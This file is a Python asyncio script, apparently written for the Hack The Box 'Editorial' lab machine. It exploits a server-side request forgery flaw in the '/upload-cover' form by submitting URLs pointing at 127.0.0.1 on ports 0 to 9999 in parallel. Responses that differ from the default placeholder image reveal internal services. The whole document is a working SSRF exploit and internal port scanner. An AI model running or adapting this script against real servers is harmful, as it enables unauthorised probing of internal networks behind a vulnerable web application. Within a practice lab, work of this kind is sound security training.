import asyncio
import aiohttp

import time


# Used for htb:editorial.  wanted parallel approach to cover large search space
# useful example of working w/ multipart/form-data too
ssrfpage = "/upload-cover"

def AsFormContent(requestto):
	data = aiohttp.FormData()
	data.add_field('bookurl',
		requestto)
	data.add_field('bookfile',
		'',
		filename='aaa.txt',
		content_type='application/octet-stream')
	return data

async def SendSSRFRequest(session,port):
	async with session.post(ssrfpage,
		data=AsFormContent(f"http://127.0.0.1:{port}")) as resp:
			if resp is None:
				print(f"ERROR: req for port {port} got none response (look for exception log above)",flush=True)
				return { "Success": False, "Port": port }

			status = resp.status
			content = await resp.text()

			if status != 200:
				print(f"ERROR: req for port {port} gave {status}:{content}")
				return { "Success": False, "Port": port }
			if "unsplash_photo_1630734277837_ebe62757b6e0" not in content:
				print(f"hit on port {port}: {content}")
				return { "Success": True,  "Port": port, "Content": content }

async def Main():
	async with aiohttp.ClientSession('http://10.10.11.20', headers={"Host": "editorial.htb"}) as session:
		tasks = [SendSSRFRequest(session, i) for i in range(0,10000)]
		results = await asyncio.gather(*tasks)
		print("Final results: ")
		print(results)

asyncio.run(Main())
